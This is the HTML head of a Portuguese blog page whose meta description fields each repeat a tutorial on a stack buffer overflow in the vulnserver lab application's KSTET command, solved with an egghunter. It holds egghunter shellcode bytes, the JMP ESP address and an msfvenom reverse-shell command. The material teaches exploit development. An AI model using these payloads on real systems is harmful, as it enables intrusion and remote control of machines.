<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Criação de Exploits - Parte 3 - Estudo de caso: vulnserver KSTET com egghunter" /><meta name="author" content="Helvio Junior (m4v3r1ck)" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ola pessoal, Neste post vamos dar inicio a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim neste post abordaremos a utilização da técnica de egghunter, que basicamente consiste em encontrar e executar nosso shellcode (egg) em outra área de memória. O Exploit 0x01 - Fuzzing Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver. Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP. [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. [/sourcecode] Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT [/sourcecode] Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados. Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0 Total Number of Strings is 681 Fuzzing Fuzzing Variable 0:0 line read=Welcome to Vulnerable Server! Enter HELP for help. Fuzzing Variable 0:1 Variablesize= 5004 Fuzzing Variable 0:2 Variablesize= 5005 Fuzzing Variable 0:3 Variablesize= 21 ^C [/sourcecode] Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug. [sourcecode language=&quot;shell&quot;]Fuzzing Variable 0:1 Variablesize= 5004 [/sourcecode] Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger: Pode-se observar que o spike enviou a requisição conforme abaixo: [sourcecode language=&quot;shell&quot;]KSTET /.:/AAAAAAAAA........ [/sourcecode] Provavelmente 5000 A com o prefixo /.:/ Vamos duplicar este exploit em python criando então uma prova de conceito (PoC) &nbsp; 0x02 - Exploit de PoC Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres /.:/ então vamos reproduzir isso: Executando nosso PoC temos a seguinte saída: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# ./02-poc.py [*] Enviando requisicao maliciosa ... [/sourcecode] E o crash ocorreu: Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre. 0x03 - Determinando o tipo de Exploit e o Offset de controle Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por: [sourcecode language=&quot;shell&quot;]41414141 [/sourcecode] Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como vanilla EIP overwrite. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da metasploit para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu. Gerando o buffer único: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_create -l 5000 [/sourcecode] Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo: Execute este script e veja como ficou o registrador EIP: Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_offset -l 5000 -q 41326341 [*] Exact match at offset 66 [/sourcecode] Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto. 0x04 - Verificando o Offset Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo: E executamos ele obtendo o resultado abaixo: Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs. Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes: Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos. Nota importante: Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros. 0x05 - Saltando para nosso Buffer O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte. [sourcecode language=&quot;shell&quot;]!mona jmp -n -r ESP [/sourcecode] Este comando nos retornou 9 opções Porém a nossa escolha foi a primeira: [sourcecode language=&quot;shell&quot;]Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) [/sourcecode] Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - &#39;\r&#39;, 0x0a - &#39;\n&#39;). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional. Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian. Segue nosso exploit atualizado: Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão Goto address in Dissassembler demonstrado abaixo: E digite o endereço da instrução JMP ESP escolhida: Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint. Agora execute o exploit e veja a aplicação parando no breakpoint selecionado Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status &quot;Breakpoint at essfunc.625011AF&quot; e não outro erro como access violation. Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs 0x06 - Saltando para o buffer maior Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes) Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos. Olhando na imagem anterior vemos o seguinte cenário: [sourcecode language=&quot;shell&quot;]00EDF9F8 43 INC EBX [/sourcecode] Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As? [sourcecode language=&quot;shell&quot;]00EDF9B2 41 INC ECX [/sourcecode] Então podemos fazer alguns cálculos para realizar a movimentação necessária [sourcecode language=&quot;shell&quot;]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70 [/sourcecode] Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX: [sourcecode language=&quot;shell&quot;]PUSH ESP POP EDX [/sourcecode] E posteriormente subtrair 0x46 (decimal 70) de seu valor: [sourcecode language=&quot;shell&quot;]SUB EDX,0x46 [/sourcecode] E por fim saltar para o endereço desejado: [sourcecode language=&quot;shell&quot;]JMP EDX [/sourcecode] Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada msf-nasm_shell conforme demonstrado abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;gt; PUSH ESP 00000000 54 push esp nasm &amp;gt; SUB EDX,0x46 00000000 83EA46 sub edx,byte +0x46 nasm &amp;gt; JMP EDX 00000000 FFE2 jmp edx nasm &amp;gt; [/sourcecode] Segue abaixo o exploit atualizado: Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP) [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;gt; JMP short -72 00000000 EBB6 jmp short 0xffffffb8 nasm &amp;gt; [/sourcecode] Segue abaixo a segunda opção: Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção. Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo: Neste ponto temos pelo menos 2 formar de continuar com o exploit: Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Este processo está descrito no post Criação de Exploits – Parte 4 – Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv Neste post abordaremos a opção 1: utilização de egghunter. 0x07 - PoC2 Localizando o Shellcode Antes de dar continuidade ao processo de exploit primeiramente precisamos entender se será possível enviar o nosso shellcode através de outro comando para o servidor. Após diversos testes encontrei a função GDOG do servidor que permite o envio de pelo menos 1000 bytes, mais que suficiente para a colocação do nosso shellcode. Para facilitar nosso teste no lugar doa 66 As vou colocar 66 0xCC (breakpoint), para que a aplicação pare a execução nele e possamos analisar a memória. Adicionalmente foi colocado no script um envio do nosso pseudo shellcode antes no buffer que irá causar o overflow, conforme exemplificado abaixo: [sourcecode language=&quot;shell&quot;]shellcode = b&quot;GDOG &quot; shellcode += &quot;T00WT00W&quot; shellcode += &quot;C&quot; * 1000 print &quot;[*] Enviando shellcode...&quot; exp.recv(4096) exp.send(shellcode) print &quot;[*] Enviando exploit...&quot; exp.recv(4096) exp.send(buffer) [/sourcecode] Execute o exploit: Note que como esperado a aplicação parou no breakpoint 0xCC: Com a ajuda do script mona podemos verificar se foi encontrado na memória [sourcecode language=&quot;shell&quot;]!mona find -s T00WT00W [/sourcecode] &nbsp; Bom! Se o mona foi capaz de achar um egghunter escrito por nós também será. 0x08 - Egghunter Egghunter é uma técnica utilizada onde temos um código relativamente pequeno +- 45 bytes que tem sua principal função buscar na memória um &#39;egg&#39; que é na verdade nosso shellcode. É muito comum neste tipo de estudo você ver o termo T00W ou W00T, ele é uma regra? Não, ele é o que geralmente usamos para fins acadêmicos, mas pode ser qualquer sequencia de 4 bytes que será utilizada para identificar o inicio do nosso shellcode. O Egghunter proposto neste post executa se forma simplificada o seguinte fluxo: Define o endereço de memória inicial da busca e salta para o passo 4; Incrementa 4Kb ao endereço de memória atual e segue para o passo 4; Incrementa 1 byte ao endereço de memória atual; Verifica se tem acesso ao endereço de memória; Se sim salta para o passo 5; caso não salta para o passo 2; Verifica se no endereço atual existe 1 instância do nosso EGG (W00T); Se existe continua a execução para o passo 6; caso contrário salta para o passo 3; Verifica se nos próximos 4 bytes existe mais 1 instância do nosso EGG (W00T); Se sim faz um JMP para o byte seguinte do WOOTWOOT; caso não salta para o passo 3; Então vamos o nosso egghunter Para compilar ele e pegar o seu opcode para colocar em nosso python execute os comandos abaixo: [sourcecode language=&quot;shell&quot;]nasm egghunter1.asm -o egghunter -l egghunter.lst cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python [/sourcecode] Tendo o seguinte resultado [sourcecode language=&quot;shell&quot;]Attempting to read payload from STDIN... Found 1 compatible encoders Attempting to encode payload with 1 iterations of generic/none generic/none succeeded with size 36 (iteration=0) generic/none chosen with final size 36 Payload size: 36 bytes Final size of python file: 184 bytes buf = &quot;&quot; buf += &quot;\x89\xca\xeb\x06\x66\x81\xca\xff\x0f\x42\x52\x6a\x02&quot; buf += &quot;\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57&quot; buf += &quot;\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot; [/sourcecode] Basta agora copiar este código para nosso exploit. Para facilitar nosso estudo fiz uma alteração no exploit adicionando um breakpoint antes da chamada JMP EDI ficando como abaixo: Ao executar o nosso exploit ele irá parar na chamada no JMP EDI para que possamos verificar como estão nossos registradores, conforme imagem abaixo: Pode-se observar que o EDI aponta para o endereço de memória [sourcecode language=&quot;shell&quot;]0x0027437D [/sourcecode] Que per sua vez é o endereço exatamente posterior ao endereço do W00TW00T, você deve ter percebido que na memória o W00TW00T aparece como T00WT00W, isso ocorre em virtude do endianess. 0x09 - Aproveite o shell Agora basta alterar os Cs para o shellcode gerado pelo msfvenom e aproveitar. Gere o shellcode com o comando abaixo, nele coloquei como badchars os clássicos nullbyte, \r e \n. [sourcecode language=&quot;shell&quot;]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python [/sourcecode] Copie o conteúdo do buffer no exploit conforme arquivo abaixo e senha feliz! &nbsp;" /><meta property="og:description" content="Ola pessoal, Neste post vamos dar inicio a nossa análise de caso do Vulnserver KSTET. Como característica este servidor é vulnerável a stack buffer overflow mas com um buffer extremamente pequeno, 66 bytes. Sendo assim neste post abordaremos a utilização da técnica de egghunter, que basicamente consiste em encontrar e executar nosso shellcode (egg) em outra área de memória. O Exploit 0x01 - Fuzzing Antes de mais nada precisamos encontrar a nossa vulnerabilidade. Para isso vamos realizar um processo de fuzzing em cima do vulnserver. Antes de iniciar o fuzzing, vamos conhecer um pouco mais da aplicação. Ao conectar na aplicação ela nos mostra uma mensagem de boas vindas e sugerindo a execução do comando HELP. [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. [/sourcecode] Ao executar o comando HELP a aplicação nos retorna os comandos disponíveis [sourcecode language=&quot;shell&quot;]# nc 172.30.200.66 9999 Welcome to Vulnerable Server! Enter HELP for help. HELP Valid Commands: HELP STATS [stat_value] RTIME [rtime_value] LTIME [ltime_value] SRUN [srun_value] TRUN [trun_value] GMON [gmon_value] GDOG [gdog_value] KSTET [kstet_value] GTER [gter_value] HTER [hter_value] LTER [lter_value] KSTAN [lstan_value] EXIT [/sourcecode] Enquanto isso em sua console principal a aplicação mostra que ocorreu uma conexão Para o processo de fuzzing vamos utilizar a aplicação spike, como sempre ao conectar no servidor ele retorna essa mensagem de boas vindas temos que informar para o spike ler essa mensagem antes de enviar os comandos desejados. Usando este arquivo do spike (demonstrado acima) iremos realizar o fuzzing na porção kstet_value do comando depois de ler a mensagem de boas vindas. Anexe o vulnserver no Immunity Debugger e execute o comando abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# generic_send_tcp 172.30.200.66 9999 01-fuzz.spk 0 0 Total Number of Strings is 681 Fuzzing Fuzzing Variable 0:0 line read=Welcome to Vulnerable Server! Enter HELP for help. Fuzzing Variable 0:1 Variablesize= 5004 Fuzzing Variable 0:2 Variablesize= 5005 Fuzzing Variable 0:3 Variablesize= 21 ^C [/sourcecode] Logo na primeira interação (demonstrada abaixo) o vulnserver travou em nosso debug. [sourcecode language=&quot;shell&quot;]Fuzzing Variable 0:1 Variablesize= 5004 [/sourcecode] Observe a saída do spike (demonstrada acima), ela nos diz que fou realizado o fuzzing na primeira variável (como os computadores iniciam em zero, nossa primeira variável é referenciada como 0). No outro lado dos dois pontos, podemos ver que temos a segunda interação do fuzzing representada pelo 1. Na outra linha o spike nos mostrou o tamanho do buffer que ele enviou, neste caso 5004 bytes. Agora podemos ver como isso ficou no Immunity Debugger: Pode-se observar que o spike enviou a requisição conforme abaixo: [sourcecode language=&quot;shell&quot;]KSTET /.:/AAAAAAAAA........ [/sourcecode] Provavelmente 5000 A com o prefixo /.:/ Vamos duplicar este exploit em python criando então uma prova de conceito (PoC) &nbsp; 0x02 - Exploit de PoC Daqui para frente utilizaremos scripts Python para realizar todo nosso processo. Como ja sabemos nosso Overflow ocorreu com 5000 bytes + 4 caracteres /.:/ então vamos reproduzir isso: Executando nosso PoC temos a seguinte saída: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# ./02-poc.py [*] Enviando requisicao maliciosa ... [/sourcecode] E o crash ocorreu: Agora que temos uma prova de conceito funcional, vamos aprofundar e determinar o tipo de overflow (se é uma substituição simples do EIP, SEH e etc...) e em que offset isso ocorre. 0x03 - Determinando o tipo de Exploit e o Offset de controle Olhando na imagem (do immunity Debugger) podemos observar que o registrador EIP foi substituido por: [sourcecode language=&quot;shell&quot;]41414141 [/sourcecode] Se você está lendo nossos posts de forma sequencial ou ja realizou uma outra exploração de Buffer Overflow sabe que A (maiúsculo) corresponde ao hexa 41. Bom! agora sabemos que temos um stacked buffer overflow de simples substituição do EIP, ou também conhecido como vanilla EIP overwrite. Agora precisamos saber em que ponto do nosso 5000 bytes está ocorrendo a substiruição do EIP. Vamos usar uma ferramenta da metasploit para gerar um buffer único e depois identificar em quem ponsto a substituição ocorreu. Gerando o buffer único: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_create -l 5000 [/sourcecode] Agora basta copiar e colar este buffer em nosso arquivo python conforme demonstrado abaixo: Execute este script e veja como ficou o registrador EIP: Agora basta usar o comando msf-pattern_offset com o valor de EIP para identificar a posição exata do buffer: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~/vulnserver/exploit1_egghunter# msf-pattern_offset -l 5000 -q 41326341 [*] Exact match at offset 66 [/sourcecode] Isso indica que o EIP inicia no offset 66, ou seja, na posição 66, em outras palavras, temos 66 bytes de caracteres antes do EIP + 4 bytes do EIP e depois o restante do buffer. Vamos atualizar nosso exploit e verificar se temos o offset correto. 0x04 - Verificando o Offset Vamos atualizar nosso exploit PoC com o tamanho do Offset conforme abaixo: E executamos ele obtendo o resultado abaixo: Isso indica que temos um exploit funcional que substituiu o EIP pelos nossos Bs, hexa 0x42, e que o ESP está apontado para o ponto exatamente posterior ao EIP, onde estão nossos Cs. Porém olhando um pouco mais a fundo em nossa pilha de memória podemos ver que temos um numero limitado de Cs mesmo tendo enviado 500, este número é exatamente 20 bytes que pode ser calculado de 2 formas diferentes: Contando: Cada linha tem 4 bytes e no stack temos 5 linhas, então 4*5 = 20 bytes Calculando: endereço inicial do stack 00FEF9F8, o primeiro caractere depois dos C está localizado em 00FEFA0C, então 00FEFA0C - 00FEF9F8 = 20 bytes Mas e dai que só tem 20 bytes? Isso indica que só teremos estes 20 bytes + os 66 bytes (antes do EIP) para realizar todo nosso processo de exploração, e um shellcode pequeno gerado pelo msfvenom tem pelo menos 354 bytes. Então teremos que ser criativos. Nota importante: Cuidado com os próximos passos para não continuar usando o buffer maior que 20 bytes após o endereço do EIP, pois isso causará problemas futuros. 0x05 - Saltando para nosso Buffer O próximo passo em nosso processo de exploração será saltar para os nossos Cs, para isso precisaremos localizar um endereço de memória (sem o nullbyte 0x00) que faça o JMP ESP ou CALL ESP, podemos usar o script Mona para nos ajudar nessa tarefa. Note que vou utlizar o -n para ignorar os endereços iniciados por null byte. [sourcecode language=&quot;shell&quot;]!mona jmp -n -r ESP [/sourcecode] Este comando nos retornou 9 opções Porém a nossa escolha foi a primeira: [sourcecode language=&quot;shell&quot;]Log data, item 11 Address=625011AF Message= 0x625011af : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (essfunc.dll) [/sourcecode] Por hora não conhecemos nenhum badchar, a não ser os classisos para um servidor baseado em comandos ASCII (0x00 - null byte, 0x0d - &#39;\r&#39;, 0x0a - &#39;\n&#39;). Adicionamente este endereço não tem outras proteções como SafeSEH e ASLR e é uma DLL do proprio sistema, o que facilita as coisas pois não corre-se o risco do endereço se alterar com a mudança de sistema operacional. Então vamos atualizar nosso exploit para realizar esse JMP ESP. Nele utilizaremos uma função chamada pack da biblioteca struct para alterar o endereço entre big endian e little endian. Segue nosso exploit atualizado: Antes de rodar nosso exploit novamente, no Immunity Debbuger clique no botão Goto address in Dissassembler demonstrado abaixo: E digite o endereço da instrução JMP ESP escolhida: Se certifique que está no endereço correto pois algumas vezes é necessário fazer este processo mais de uma vez para alcançar o endereço correto. Uma vez no endereço correto pressionne F2 para adicionar um breakpoint. Agora execute o exploit e veja a aplicação parando no breakpoint selecionado Observe que essa parada foi devido ao breakpoint, sabemos isso por causa do texto na barra de status &quot;Breakpoint at essfunc.625011AF&quot; e não outro erro como access violation. Para dar continuidade pressione F7 (Step Into) para permitir o JMP para o endereço do ESP que por sua vez é a localização dos nossos Cs 0x06 - Saltando para o buffer maior Até este ponto conseguimos saltar para o nosso ESP que é um buffer com 20 bytes, que não da p/ fazer quase nada, mas é mais que suficiente para que possamos fazer um salto para traz indo para nossos As que é um buffer um pouco maior (66 bytes) Mas como fazemos isso? Há diversas formas, vamos explorar uma delas aqui, mas para isso precisamos saber onde estamos. Olhando na imagem anterior vemos o seguinte cenário: [sourcecode language=&quot;shell&quot;]00EDF9F8 43 INC EBX [/sourcecode] Estamos no endereço de memória 00EDF9F8. Mas onde está o início dos nossos As? [sourcecode language=&quot;shell&quot;]00EDF9B2 41 INC ECX [/sourcecode] Então podemos fazer alguns cálculos para realizar a movimentação necessária [sourcecode language=&quot;shell&quot;]00EDF9F8 (Localização atual) - 00EDF9B2 (Posição desejada) = Valor em Hexa: 46 ou Valor em Decimal: 70 [/sourcecode] Para realizar os calculos do ESP de forma segura vamos colocar seu valor em EDX: [sourcecode language=&quot;shell&quot;]PUSH ESP POP EDX [/sourcecode] E posteriormente subtrair 0x46 (decimal 70) de seu valor: [sourcecode language=&quot;shell&quot;]SUB EDX,0x46 [/sourcecode] E por fim saltar para o endereço desejado: [sourcecode language=&quot;shell&quot;]JMP EDX [/sourcecode] Caso não esteja familiarizado o mestasploit tem uma ferramenta para nos ajudar neste processo de criação dos OPCODES chamada msf-nasm_shell conforme demonstrado abaixo: [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;gt; PUSH ESP 00000000 54 push esp nasm &amp;gt; SUB EDX,0x46 00000000 83EA46 sub edx,byte +0x46 nasm &amp;gt; JMP EDX 00000000 FFE2 jmp edx nasm &amp;gt; [/sourcecode] Segue abaixo o exploit atualizado: Este é um dos métodos de realizar este processo, e o escolhido por mim neste exploit, porém há métodos mais econômicos do ponto de vista de consumo de espaço uma vez que temos somente 20 bytes. Como por exemplo o JUMP para 72 bytes para traz (70 bytes desejados + 2 consumido pela da instrução de JMP) [sourcecode language=&quot;shell&quot;]root@M4v3r1cK:~# msf-nasm_shell nasm &amp;gt; JMP short -72 00000000 EBB6 jmp short 0xffffffb8 nasm &amp;gt; [/sourcecode] Segue abaixo a segunda opção: Note que como neste nosso exploit nesse primeiro estágio só precisamos realizar o salto para nosso segundo estágio (nossos As) não faz diferença no método utilizado, mas caso precisasse realizar outras operações nestes restritos 20 bytes essa segunda opção certamente seria a melhor opção. Reiniciando o Immunity, redefinindo nosso breakpoint no commando JMP ESP e então pressionando F7 quando a execução parar no breakpoint chegaremos ao resultado abaixo: Neste ponto temos pelo menos 2 formar de continuar com o exploit: Verificando a possibilidade de enviar o shellcode através de outro comando do servidor e buscando essa área de memória com egghunter Reutilizando a função WS2_32.recv (que foi a função utilizada para ler nosso buffer inicial) para ler da nossa própria conexão um novo buffer (shellcode) e posteriormente executa-lo. Este processo está descrito no post Criação de Exploits – Parte 4 – Estudo de caso: vulnserver KSTET com reaproveitamento da função WS2_32 Recv Neste post abordaremos a opção 1: utilização de egghunter. 0x07 - PoC2 Localizando o Shellcode Antes de dar continuidade ao processo de exploit primeiramente precisamos entender se será possível enviar o nosso shellcode através de outro comando para o servidor. Após diversos testes encontrei a função GDOG do servidor que permite o envio de pelo menos 1000 bytes, mais que suficiente para a colocação do nosso shellcode. Para facilitar nosso teste no lugar doa 66 As vou colocar 66 0xCC (breakpoint), para que a aplicação pare a execução nele e possamos analisar a memória. Adicionalmente foi colocado no script um envio do nosso pseudo shellcode antes no buffer que irá causar o overflow, conforme exemplificado abaixo: [sourcecode language=&quot;shell&quot;]shellcode = b&quot;GDOG &quot; shellcode += &quot;T00WT00W&quot; shellcode += &quot;C&quot; * 1000 print &quot;[*] Enviando shellcode...&quot; exp.recv(4096) exp.send(shellcode) print &quot;[*] Enviando exploit...&quot; exp.recv(4096) exp.send(buffer) [/sourcecode] Execute o exploit: Note que como esperado a aplicação parou no breakpoint 0xCC: Com a ajuda do script mona podemos verificar se foi encontrado na memória [sourcecode language=&quot;shell&quot;]!mona find -s T00WT00W [/sourcecode] &nbsp; Bom! Se o mona foi capaz de achar um egghunter escrito por nós também será. 0x08 - Egghunter Egghunter é uma técnica utilizada onde temos um código relativamente pequeno +- 45 bytes que tem sua principal função buscar na memória um &#39;egg&#39; que é na verdade nosso shellcode. É muito comum neste tipo de estudo você ver o termo T00W ou W00T, ele é uma regra? Não, ele é o que geralmente usamos para fins acadêmicos, mas pode ser qualquer sequencia de 4 bytes que será utilizada para identificar o inicio do nosso shellcode. O Egghunter proposto neste post executa se forma simplificada o seguinte fluxo: Define o endereço de memória inicial da busca e salta para o passo 4; Incrementa 4Kb ao endereço de memória atual e segue para o passo 4; Incrementa 1 byte ao endereço de memória atual; Verifica se tem acesso ao endereço de memória; Se sim salta para o passo 5; caso não salta para o passo 2; Verifica se no endereço atual existe 1 instância do nosso EGG (W00T); Se existe continua a execução para o passo 6; caso contrário salta para o passo 3; Verifica se nos próximos 4 bytes existe mais 1 instância do nosso EGG (W00T); Se sim faz um JMP para o byte seguinte do WOOTWOOT; caso não salta para o passo 3; Então vamos o nosso egghunter Para compilar ele e pegar o seu opcode para colocar em nosso python execute os comandos abaixo: [sourcecode language=&quot;shell&quot;]nasm egghunter1.asm -o egghunter -l egghunter.lst cat egghunter | msfvenom -p - -a x86 --platform win -e generic/none -f python [/sourcecode] Tendo o seguinte resultado [sourcecode language=&quot;shell&quot;]Attempting to read payload from STDIN... Found 1 compatible encoders Attempting to encode payload with 1 iterations of generic/none generic/none succeeded with size 36 (iteration=0) generic/none chosen with final size 36 Payload size: 36 bytes Final size of python file: 184 bytes buf = &quot;&quot; buf += &quot;\x89\xca\xeb\x06\x66\x81\xca\xff\x0f\x42\x52\x6a\x02&quot; buf += &quot;\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57&quot; buf += &quot;\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot; [/sourcecode] Basta agora copiar este código para nosso exploit. Para facilitar nosso estudo fiz uma alteração no exploit adicionando um breakpoint antes da chamada JMP EDI ficando como abaixo: Ao executar o nosso exploit ele irá parar na chamada no JMP EDI para que possamos verificar como estão nossos registradores, conforme imagem abaixo: Pode-se observar que o EDI aponta para o endereço de memória [sourcecode language=&quot;shell&quot;]0x0027437D [/sourcecode] Que per sua vez é o endereço exatamente posterior ao endereço do W00TW00T, você deve ter percebido que na memória o W00TW00T aparece como T00WT00W, isso ocorre em virtude do endianess. 0x09 - Aproveite o shell Agora basta alterar os Cs para o shellcode gerado pelo msfvenom e aproveitar. Gere o shellcode com o comando abaixo, nele coloquei como badchars os clássicos nullbyte, \r e \n. [sourcecode language=&quot;shell&quot;]msfvenom -p windows/shell_reverse_tcp lhost=192.168.15.177 lport=4444 -a x86 --platform win -e x86/alpha_mixed -b &quot;\x00\x0a\x0d&quot; -f python [/sourcecode] Copie o conteúdo do buffer no exploit conforme arquivo abaixo e senha feliz! &nbsp;" /><link rel="canonical" 